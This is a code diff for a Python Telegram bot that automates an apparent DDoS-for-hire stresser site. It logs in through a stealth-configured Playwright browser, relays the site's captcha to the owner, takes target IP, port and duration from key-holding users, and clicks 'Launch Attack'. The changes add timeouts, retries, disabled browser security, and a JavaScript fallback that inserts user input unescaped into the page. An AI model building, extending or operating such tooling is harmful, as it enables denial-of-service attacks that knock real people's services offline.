@@ -1,5 +1,5 @@
 """
-SOUL BOT - Railway Optimized Version
+SOUL BOT - Railway Optimized Version with Better Timeout Handling
 """
 
 import asyncio
@@ -12,7 +12,7 @@ import sys
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
-from playwright.async_api import async_playwright
+from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
 
 # --- Configuration ---
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
@@ -103,7 +103,7 @@ def is_approved(user_id):
             pass
     return False
 
-# --- Browser Management ---
+# --- Browser Management with Extended Timeouts ---
 async def initialize_browser():
     global playwright, browser, context, page
     try:
@@ -116,6 +116,7 @@ async def initialize_browser():
         
         browser = await playwright.chromium.launch(
             headless=HEADLESS_MODE,
+            timeout=60000,  # 60 seconds timeout
             args=[
                 '--no-sandbox',
                 '--disable-setuid-sandbox',
@@ -124,15 +125,21 @@ async def initialize_browser():
                 '--disable-gpu',
                 '--window-size=1920,1080',
                 '--disable-blink-features=AutomationControlled',
+                '--disable-web-security',
+                '--disable-features=VizDisplayCompositor',
             ]
         )
         
         context = await browser.new_context(
             viewport={'width': 1920, 'height': 1080},
-            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            ignore_https_errors=True
         )
         
         page = await context.new_page()
+        
+        # Set default timeout to 60 seconds
+        page.set_default_timeout(60000)
         
         # Add stealth script
         await page.add_init_script("""
@@ -157,8 +164,8 @@ async def auto_login():
     global page, logged_in
     try:
         logger.info("Attempting auto-login...")
-        await page.goto("https://satellitestress.st/login", wait_until="domcontentloaded", timeout=30000)
-        await asyncio.sleep(2)
+        await page.goto("https://satellitestress.st/login", wait_until="domcontentloaded", timeout=60000)
+        await asyncio.sleep(3)
         
         current_url = page.url
         if "dashboard" in current_url or "attack" in current_url:
@@ -166,15 +173,21 @@ async def auto_login():
             logger.info("Already logged in!")
             return
         
-        await page.fill("#token", LOGIN_TOKEN)
-        await asyncio.sleep(1)
-        await page.click("button[type='submit']")
-        await asyncio.sleep(3)
+        await page.fill("#token", LOGIN_TOKEN, timeout=30000)
+        await asyncio.sleep(2)
         
-        current_url = page.url
-        if "dashboard" in current_url or "attack" in current_url:
-            logged_in = True
-            logger.info("Auto-login successful!")
+        # Try to find and click submit button
+        submit_button = await page.query_selector("button[type='submit']")
+        if submit_button:
+            await submit_button.click()
+            await asyncio.sleep(5)
+            
+            current_url = page.url
+            if "dashboard" in current_url or "attack" in current_url:
+                logged_in = True
+                logger.info("Auto-login successful!")
+            else:
+                logger.warning("Auto-login may have failed - manual login may be needed")
             
     except Exception as e:
         logger.error(f"Auto-login error: {e}")
@@ -261,7 +274,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
-    await query.answer()
+    try:
+        await query.answer()
+    except:
+        pass  # Ignore if query is too old
+    
     user_id = query.from_user.id
     callback_data = query.data
 
@@ -332,7 +349,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.message.reply_text("❌ Not authorized.")
             return
         user_state[user_id] = {'action': 'run', 'step': 'awaiting_params'}
-        await query.message.reply_text("🚀 Run Attack\n\nSend: `<IP> <PORT> <TIME>`", parse_mode='Markdown')
+        await query.message.reply_text("🚀 Run Attack\n\nSend: `<IP> <PORT> <TIME>`\nExample: `192.168.1.1 80 300`", parse_mode='Markdown')
         return
 
     elif callback_data == "stats":
@@ -387,7 +404,7 @@ async def process_approve(update: Update, text: str):
     try:
         parts = text.strip().split()
         if len(parts) != 2:
-            await update.message.reply_text("❌ Invalid format.")
+            await update.message.reply_text("❌ Invalid format. Use: user_id days")
             return
 
         target_id, days = parts[0], int(parts[1])
@@ -421,7 +438,7 @@ async def process_add_admin(update: Update, text: str):
     try:
         parts = text.strip().split()
         if len(parts) != 2:
-            await update.message.reply_text("❌ Invalid format.")
+            await update.message.reply_text("❌ Invalid format. Use: user_id days")
             return
 
         target_id, days = parts[0], int(parts[1])
@@ -474,35 +491,64 @@ async def process_run(update: Update, text: str):
     user_id = update.effective_user.id
 
     if not logged_in or not page:
-        await update.message.reply_text("❌ Not logged in. Please login first.")
+        await update.message.reply_text("❌ Not logged in. Please click the Login button first.")
         return
 
     try:
         parts = text.strip().split()
         if len(parts) != 3:
-            await update.message.reply_text("❌ Invalid format.")
+            await update.message.reply_text("❌ Invalid format. Use: IP PORT TIME\nExample: 192.168.1.1 80 300")
             return
 
         ip, port, duration = parts
 
         await update.message.reply_text(f"⚡ Preparing attack on {ip}:{port} for {duration}s...")
 
-        await page.goto("https://satellitestress.st/attack", wait_until="domcontentloaded", timeout=30000)
-        await asyncio.sleep(2)
+        try:
+            await page.goto("https://satellitestress.st/attack", wait_until="domcontentloaded", timeout=60000)
+            await asyncio.sleep(3)
+        except PlaywrightTimeoutError:
+            await update.message.reply_text("⚠️ Website is slow, retrying...")
+            await page.goto("https://satellitestress.st/attack", wait_until="domcontentloaded", timeout=60000)
+            await asyncio.sleep(3)
 
-        # Fill form
-        await page.fill("input[placeholder='104.29.138.132']", ip)
-        await asyncio.sleep(0.3)
-        await page.fill("input[placeholder='80']", port)
-        await asyncio.sleep(0.3)
-        await page.fill("input[placeholder='60']", duration)
-        await asyncio.sleep(0.5)
-        await page.click("button:has-text('Launch Attack')")
+        # Fill form with multiple attempts
+        try:
+            # Try primary selectors
+            await page.fill("input[placeholder='104.29.138.132']", ip, timeout=10000)
+            await asyncio.sleep(0.5)
+            await page.fill("input[placeholder='80']", port, timeout=10000)
+            await asyncio.sleep(0.5)
+            await page.fill("input[placeholder='60']", duration, timeout=10000)
+            await asyncio.sleep(1)
+            
+            # Click launch button
+            await page.click("button:has-text('Launch Attack')", timeout=10000)
+            
+        except Exception as e:
+            logger.warning(f"Primary method failed: {e}, trying fallback...")
+            # Fallback: JavaScript injection
+            await page.evaluate(f"""
+                const inputs = document.querySelectorAll('input[type="text"], input[type="number"]');
+                if(inputs[0]) inputs[0].value = '{ip}';
+                if(inputs[1]) inputs[1].value = '{port}';
+                if(inputs[2]) inputs[2].value = '{duration}';
+                
+                const buttons = document.querySelectorAll('button');
+                for(let btn of buttons) {{
+                    if(btn.textContent.includes('Launch') || btn.textContent.includes('Attack')) {{
+                        btn.click();
+                        break;
+                    }}
+                }}
+            """)
 
-        await asyncio.sleep(2)
-        await update.message.reply_text(f"🚀 Attack Started!\n🎯 {ip}:{port}\n⏱️ {duration}s")
+        await asyncio.sleep(3)
+        await update.message.reply_text(f"✅ Attack Started!\n🎯 {ip}:{port}\n⏱️ {duration}s")
         user_state.pop(user_id, None)
 
+    except PlaywrightTimeoutError:
+        await update.message.reply_text("⏱️ Website is taking too long to respond. Please try again in a moment.")
     except Exception as e:
         logger.error(f"Attack error: {e}")
         await update.message.reply_text(f"❌ Attack Failed: {str(e)[:100]}")
@@ -545,13 +591,20 @@ async def start_login_flow(message):
     global page
     try:
         if not page:
+            await message.reply_text("🔄 Initializing browser...")
             if not await initialize_browser():
-                await message.reply_text("❌ Failed to initialize browser.")
+                await message.reply_text("❌ Failed to initialize browser. Please try again.")
                 return
 
         await message.reply_text("🌐 Loading login page...")
-        await page.goto("https://satellitestress.st/login", wait_until="domcontentloaded", timeout=30000)
-        await asyncio.sleep(2)
+        
+        try:
+            await page.goto("https://satellitestress.st/login", wait_until="domcontentloaded", timeout=60000)
+        except PlaywrightTimeoutError:
+            await message.reply_text("⚠️ Website is slow, retrying...")
+            await page.goto("https://satellitestress.st/login", wait_until="domcontentloaded", timeout=60000)
+        
+        await asyncio.sleep(3)
 
         current_url = page.url
         if "dashboard" in current_url or "attack" in current_url:
@@ -570,48 +623,56 @@ async def start_login_flow(message):
 async def enter_token(update: Update, token: str):
     global page
     try:
-        await page.fill("#token", token)
-        await asyncio.sleep(1)
+        await page.fill("#token", token, timeout=30000)
+        await asyncio.sleep(2)
 
         captcha_present = await page.query_selector("input[aria-label='Enter captcha answer']")
 
         if captcha_present:
-            screenshot = await page.screenshot()
-            await update.message.reply_photo(photo=screenshot, caption="Enter the captcha:")
-            user_state[OWNER_ID] = {'step': 'waiting_captcha'}
+            try:
+                screenshot = await page.screenshot()
+                await update.message.reply_photo(photo=screenshot, caption="🔢 Enter the captcha characters:")
+                user_state[OWNER_ID] = {'step': 'waiting_captcha'}
+            except Exception as e:
+                await update.message.reply_text("⚠️ Could not take screenshot, but captcha is required. Please enter the captcha manually from the website.")
+                user_state[OWNER_ID] = {'step': 'waiting_captcha'}
         else:
-            await page.click("button[type='submit']")
-            await asyncio.sleep(3)
+            await page.click("button[type='submit']", timeout=30000)
+            await asyncio.sleep(5)
 
             current_url = page.url
             if "dashboard" in current_url or "attack" in current_url:
                 global logged_in
                 logged_in = True
-                await update.message.reply_text("✅ Login Successful!")
+                await update.message.reply_text("✅ Login Successful! 🎉\n\nYou can now run attacks!")
                 user_state.pop(OWNER_ID, None)
             else:
-                await update.message.reply_text("❌ Login failed.")
+                await update.message.reply_text("❌ Login failed. Please check your token and try again.")
                 user_state.pop(OWNER_ID, None)
 
+    except PlaywrightTimeoutError:
+        await update.message.reply_text("⏱️ Timeout while logging in. The website may be slow. Please try again.")
+        user_state.pop(OWNER_ID, None)
     except Exception as e:
-        await update.message.reply_text(f"❌ Error: {e}")
+        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
+        user_state.pop(OWNER_ID, None)
 
 async def enter_captcha(update: Update, captcha: str):
     global page, logged_in
     try:
-        await page.fill("input[aria-label='Enter captcha answer']", captcha)
-        await asyncio.sleep(0.5)
-        await page.click("button[type='submit']")
-        await asyncio.sleep(3)
+        await page.fill("input[aria-label='Enter captcha answer']", captcha, timeout=30000)
+        await asyncio.sleep(1)
+        await page.click("button[type='submit']", timeout=30000)
+        await asyncio.sleep(5)
 
         current_url = page.url
         if "dashboard" in current_url or "attack" in current_url:
             logged_in = True
-            await update.message.reply_text("✅ Login Successful!")
+            await update.message.reply_text("✅ Login Successful! 🎉\n\nYou can now run attacks!")
         else:
-            await update.message.reply_text("❌ Login failed.")
+            await update.message.reply_text("❌ Login failed. Invalid captcha or token.")
     except Exception as e:
-        await update.message.reply_text(f"❌ Error: {e}")
+        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
     finally:
         user_state.pop(OWNER_ID, None)
 
@@ -620,7 +681,7 @@ async def check_status(message):
     if logged_in:
         await message.reply_text("✅ Status: LOGGED IN 🟢\nReady for attacks!")
     else:
-        await message.reply_text("❌ Status: NOT LOGGED IN 🔴")
+        await message.reply_text("❌ Status: NOT LOGGED IN 🔴\nPlease click the Login button to authenticate.")
 
 async def show_stats(message, user_id):
     approved_count = len(data.get("approved_users", {}))
@@ -630,29 +691,32 @@ async def show_stats(message, user_id):
 
     await message.reply_text(
         f"📊 Statistics\n\n"
-        f"✅ Approved: {approved_count}\n"
+        f"✅ Approved Users: {approved_count}\n"
         f"👮 Admins: {admin_count}\n"
-        f"🎟️ Keys: {key_count}\n"
-        f"✔ Redeemed: {redeemed_count}"
+        f"🎟️ Total Keys: {key_count}\n"
+        f"✔ Redeemed Keys: {redeemed_count}\n\n"
+        f"🔑 Owner ID: {OWNER_ID}"
     )
 
 async def show_my_status(message, user_id):
     if str(user_id) in data.get("approved_users", {}):
         expiry = data["approved_users"][str(user_id)].get("expiry")
-        await message.reply_text(f"✅ Approved\nExpires: {expiry}")
+        time_left = (datetime.strptime(expiry, "%Y-%m-%d") - datetime.now()).days
+        await message.reply_text(f"✅ Status: Approved\n⏰ Expires: {expiry}\n📅 {time_left} days remaining")
     elif str(user_id) in data.get("admins", {}):
         expiry = data["admins"][str(user_id)].get("expiry")
-        await message.reply_text(f"👮 Admin\nExpires: {expiry}")
+        time_left = (datetime.strptime(expiry, "%Y-%m-%d") - datetime.now()).days
+        await message.reply_text(f"👮 Status: Admin\n⏰ Expires: {expiry}\n📅 {time_left} days remaining")
     elif is_owner(user_id):
-        await message.reply_text("🔑 Owner\nAccess: Unlimited")
+        await message.reply_text("🔑 Status: Owner\n♾️ Access: Unlimited")
     else:
-        await message.reply_text("❌ No Access\nRedeem a key!")
+        await message.reply_text("❌ Status: No Access\n💡 Redeem a key to get access!")
 
 async def logout_session(message):
     global logged_in
     await close_browser()
     logged_in = False
-    await message.reply_text("✅ Browser session closed.")
+    await message.reply_text("✅ Browser session closed. You'll need to login again to run attacks.")
 
 # --- Main Function ---
 async def run_bot():
